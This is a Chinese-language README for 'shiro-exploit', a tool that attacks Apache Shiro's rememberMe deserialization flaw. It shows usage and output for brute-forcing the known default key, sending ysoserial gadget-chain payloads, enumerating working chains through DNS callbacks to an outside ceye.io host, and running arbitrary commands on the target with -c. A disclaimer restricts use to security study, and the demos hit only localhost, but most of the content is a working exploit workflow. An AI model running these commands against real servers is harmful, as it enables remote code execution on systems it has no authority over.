> 郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。

## 使用方法

```bash
➜  ~ shiro-exploit --help
Usage: shiro-exploit [--key <key>] [-m <mode>] [-t <target>] [-s <ser>] [--file <file>] [--keys <keys>] [--csv <csv>] [--proxy <proxy>] [--timeout <timeout>] [--thread <thread>] [--chain] [--exploit] [--dns <dns>] [-p <payload>] [-c <command>] [--echo-name <echo-name>] [--command-name <command-name>] [-l]

shiro-exploit

Options:
  --key             you can specify known keys
  -m, --mode        apache-shiro encryption algorithm,default: CBC
  -t, --target      the target
  -s, --ser         serialize file
  --file            read the target from the file
  --keys            read the key from the file
  --csv             export to the csv file
  --proxy           proxy to use for requests
                    (ex:[http(s)|socks5(h)]://host:port)
  --timeout         set request timeout
  --thread          number of concurrent threads
  --chain           enum chain mode
  --exploit         exploit mode
  --dns             dns identifier, default: 981tzg.ceye.io
  -p, --payload     select a payload
  -c, --command     command to execute
  --echo-name       tomcat echo request header name
  --command-name    tomcat command request header name
  -l, --list        list all payload
  --help            display usage information

```

## 详细参数

- `--key`指定Key，默认`kPH+bIxk5D2deZiIxcaaaA==`
- `-m`指定加密模式，默认`CBC`,可选：`GCM`
- `-t`单个目标
- `-s`读入ysoserial生成的文件作为payload
- `--file`从文件读入目标
- `--keys`从文件读入key
- `--csv`导出到csv文件
- `--exploit`利用模式，爆破出key后，如果开启exploit模式会读入ysoserial生成的文件作为payload，如果`--ser`
  参数为空，则为`--dns`作为URL_DNS的参数生成payload
- `--dns`验证的DNS服务器，请求为目标的`主机名_端口.你的DNS记录服务器`，默认为`981tzg.ceye.io`
- `-p`使用内置payload，配合`-c`或者`--dns`和`--echo-name`，`--command-name`，tomcat回显后面再更新
- `-l`列出内置payload
- `--chain`枚举利用链，结果查看DNS记录服务，前缀就是利用链名称。

## 使用ysoserial文件

```bash
➜  ~ shiro-exploit -t http://127.0.0.1:8080 --exploit --ser /home/kali-team/1.ser                 
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+
| url                                                                     | method | verify | mode | key                      |
+=========================================================================+========+========+======+==========================+
| http://127.0.0.1:8080/login;jsessionid=EAEAD8C3FA8884D816F575E55B654694 | GET    | true   | CBC  | kPH+bIxk5D2deZiIxcaaaA== |
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+

```

## 使用DNS记录验证漏洞

```bash
➜  ~ shiro-exploit -t http://127.0.0.1:8080 --exploit --dns 981tzg.ceye.io
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+
| url                                                                     | method | verify | mode | key                      |
+=========================================================================+========+========+======+==========================+
| http://127.0.0.1:8080/login;jsessionid=E01994D45911DE55FCE6606CFFF48AC7 | GET    | true   | CBC  | kPH+bIxk5D2deZiIxcaaaA== |
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+

```

## 爆破利用链

- 主要利用ping命令带上利用链名称拼接到DNS前缀，如果能在DNS记录中看到说明可以使用该利用链

```bash
➜  ~ shiro-exploit -t http://127.0.0.1:8080 --exploit --dns 981tzg.ceye.io --chain
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+
| url                                                                     | method | verify | mode | key                      |
+=========================================================================+========+========+======+==========================+
| http://127.0.0.1:8080/login;jsessionid=E01994D45911DE55FCE6606CFFF48AC7 | GET    | true   | CBC  | kPH+bIxk5D2deZiIxcaaaA== |
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+

```

- 查看DNS记录得到可用利用链，说明`bs1`,`cck3`,`cc5`,`cc7`,`cck1`和`cc6`利用链可用

```csv
969227011	bs1.127.0.0.1.8080.981tzg.ceye.io	127.0.0.1	2022-12-22 13:48:20
969226980	bs1.127.0.0.1.8080.981tzg.ceye.io	127.0.0.1	2022-12-22 13:48:19
969226976	ccK3.127.0.0.1.8080.981tZG.cEYE.Io	127.0.0.1	2022-12-22 13:48:19
969226947	cc5.127.0.0.1.8080.981tzg.ceye.io	127.0.0.1	2022-12-22 13:48:18
969226945	cc7.127.0.0.1.8080.981tzg.ceye.io	127.0.0.1	2022-12-22 13:48:18
969226936	cCK3.127.0.0.1.8080.981tzg.ceyE.iO	127.0.0.1	2022-12-22 13:48:18
969226932	cck1.127.0.0.1.8080.981tzg.ceye.io	127.0.0.1	2022-12-22 13:48:18
969226818	cc6.127.0.0.1.8080.981tzg.ceye.io	127.0.0.1	2022-12-22 13:48:14
```

## 使用内置ysoserial

- payload来自：(ysoserial_rs)[https://github.com/emo-cat/ysoserial_rs]
- 例如使用利用`commons_collections_k1`链执行命令，使用`-p`指定利用链，`-c`指定要执行的命令

```bash
➜  ~ shiro-exploit -t http://127.0.0.1:8080 --exploit -p cck1 -c "ping qq.com"                                    
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+
| url                                                                     | method | verify | mode | key                      |
+=========================================================================+========+========+======+==========================+
| http://127.0.0.1:8080/login;jsessionid=5FAF1087D2448C017C2959B2AC02CDAF | GET    | true   | CBC  | kPH+bIxk5D2deZiIxcaaaA== |
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+

```